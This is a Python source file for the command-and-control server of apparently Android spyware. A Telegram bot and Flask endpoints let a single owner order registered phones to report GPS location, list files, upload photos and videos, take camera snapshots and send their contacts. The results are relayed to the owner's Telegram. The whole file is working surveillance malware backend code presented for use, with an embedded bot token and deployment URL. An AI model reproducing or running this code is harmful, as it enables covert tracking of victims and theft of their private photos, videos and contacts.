import telebot
import requests
import json
import time
import os
import sqlite3
from threading import Thread
from flask import Flask, request, jsonify
import base64
import io

# ===== CONFIGURATION (REPLACE THESE) =====
BOT_TOKEN = "8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM"
OWNER_ID = 2062068620  # Your Telegram user ID
PUBLIC_URL = "https://burhan-spy-bot-production.up.railway.app"
SERVER_PORT = 5000

# ===== DATABASE SETUP =====
DB_FILE = "devices.db"
conn = sqlite3.connect(DB_FILE, check_same_thread=False)
c = conn.cursor()
c.execute("""CREATE TABLE IF NOT EXISTS devices (
    device_id TEXT PRIMARY KEY,
    key TEXT,
    expiry TEXT,
    registered_at TEXT
)""")
conn.commit()

# ===== BOT & FLASK INIT =====
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# In-memory command queue (device_id -> command dict)
device_commands = {}
# In-memory results (device_id -> result dict)
device_results = {}

# ===== HELPER FUNCTIONS =====
def db_add_device(device_id, key, expiry):
    c.execute("INSERT OR REPLACE INTO devices (device_id, key, expiry, registered_at) VALUES (?, ?, ?, ?)",
              (device_id, key, expiry, time.strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()

def db_get_all_devices():
    c.execute("SELECT device_id, key, expiry FROM devices")
    return c.fetchall()

def db_get_device(device_id):
    c.execute("SELECT * FROM devices WHERE device_id=?", (device_id,))
    return c.fetchone()

def is_owner(message):
    return message.chat.id == OWNER_ID

def send_command(device_id, command, **params):
    device_commands[device_id] = {"command": command, "params": params}

# ===== TELEGRAM BOT COMMANDS =====

@bot.message_handler(commands=['start'])
def start(message):
    if not is_owner(message):
        bot.reply_to(message, "Unauthorized access.")
        return
    text = """
🚀 DarkNet Bot Active (Private)\n
Commands:\n
/locate <device_id> - Get GPS + device info
/devices - List all registered devices
/files <device_id> - List all file names
/getphoto <device_id> <filename> - Request a photo
/getvideo <device_id> <filename> - Request a video
/camera <device_id> [front|back] - Capture snapshot
/ping <device_id> - Check if device is alive
/stats - Total device count
/contacts <device_id> - Fetch all contacts
"""
    bot.reply_to(message, text)

@bot.message_handler(commands=['locate'])
def locate(message):
    if not is_owner(message):
        return
    try:
        device_id = message.text.split()[1]
        send_command(device_id, "locate")
        bot.reply_to(message, f"📍 Locate request sent to {device_id}")
    except:
        bot.reply_to(message, "Usage: /locate <device_id>")

@bot.message_handler(commands=['devices'])
def devices(message):
    if not is_owner(message):
        return
    rows = db_get_all_devices()
    if not rows:
        bot.reply_to(message, "No devices registered.")
        return
    text = "📋 Registered Devices:\n"
    for row in rows:
        text += f"ID: {row[0]} | Key: {row[1]} | Expiry: {row[2]}\n"
    bot.reply_to(message, text)

@bot.message_handler(commands=['files'])
def files(message):
    if not is_owner(message):
        return
    try:
        device_id = message.text.split()[1]
        send_command(device_id, "files")
        bot.reply_to(message, f"📁 File list request sent to {device_id}")
    except:
        bot.reply_to(message, "Usage: /files <device_id>")

@bot.message_handler(commands=['getphoto'])
def getphoto(message):
    if not is_owner(message):
        return
    try:
        parts = message.text.split()
        device_id = parts[1]
        filename = " ".join(parts[2:])
        send_command(device_id, "getphoto", filename=filename)
        bot.reply_to(message, f"🖼️ Photo request sent to {device_id} for '{filename}'")
    except:
        bot.reply_to(message, "Usage: /getphoto <device_id> <filename>")

@bot.message_handler(commands=['getvideo'])
def getvideo(message):
    if not is_owner(message):
        return
    try:
        parts = message.text.split()
        device_id = parts[1]
        filename = " ".join(parts[2:])
        send_command(device_id, "getvideo", filename=filename)
        bot.reply_to(message, f"🎥 Video request sent to {device_id} for '{filename}'")
    except:
        bot.reply_to(message, "Usage: /getvideo <device_id> <filename>")

@bot.message_handler(commands=['camera'])
def camera(message):
    if not is_owner(message):
        return
    try:
        parts = message.text.split()
        device_id = parts[1]
        facing = parts[2] if len(parts) > 2 else "back"
        send_command(device_id, "camera", facing=facing)
        bot.reply_to(message, f"📸 Camera request sent to {device_id} ({facing})")
    except:
        bot.reply_to(message, "Usage: /camera <device_id> [front|back]")

@bot.message_handler(commands=['ping'])
def ping(message):
    if not is_owner(message):
        return
    try:
        device_id = message.text.split()[1]
        send_command(device_id, "ping")
        bot.reply_to(message, f"📡 Ping sent to {device_id}")
    except:
        bot.reply_to(message, "Usage: /ping <device_id>")

@bot.message_handler(commands=['stats'])
def stats(message):
    if not is_owner(message):
        return
    rows = db_get_all_devices()
    bot.reply_to(message, f"📊 Total devices: {len(rows)}")

@bot.message_handler(commands=['contacts'])
def contacts(message):
    if not is_owner(message):
        return
    try:
        device_id = message.text.split()[1]
        send_command(device_id, "contacts")
        bot.reply_to(message, f"📇 Contacts request sent to {device_id}")
    except:
        bot.reply_to(message, "Usage: /contacts <device_id>")

# ===== FLASK ENDPOINTS FOR ANDROID =====

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    device_id = data.get('device_id')
    key = data.get('key')
    expiry = data.get('expiry', 'N/A')
    if device_id:
        db_add_device(device_id, key, expiry)
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

@app.route('/get_command', methods=['GET'])
def get_command():
    device_id = request.args.get('device_id')
    if device_id in device_commands:
        cmd = device_commands.pop(device_id)
        return jsonify(cmd)
    else:
        return jsonify({"command": "none"})

@app.route('/post_result', methods=['POST'])
def post_result():
    data = request.json
    device_id = data.get('device_id')
    result = data.get('result')
    msg_type = data.get('type', 'text')
    if msg_type == 'photo':
        # result is base64 string
        photo_bytes = base64.b64decode(result)
        bio = io.BytesIO(photo_bytes)
        bio.name = "photo.jpg"
        bot.send_photo(OWNER_ID, photo=bio)
    elif msg_type == 'video':
        video_bytes = base64.b64decode(result)
        bio = io.BytesIO(video_bytes)
        bio.name = "video.mp4"
        bot.send_video(OWNER_ID, video=bio)
    elif msg_type == 'text':
        bot.send_message(OWNER_ID, f"📋 Result from {device_id}:\n{result}")
    return jsonify({"status": "ok"})

# ===== START =====
def run_bot():
    bot.polling(non_stop=True)

if __name__ == "__main__":
    Thread(target=run_bot).start()
    app.run(host="0.0.0.0", port=SERVER_PORT)
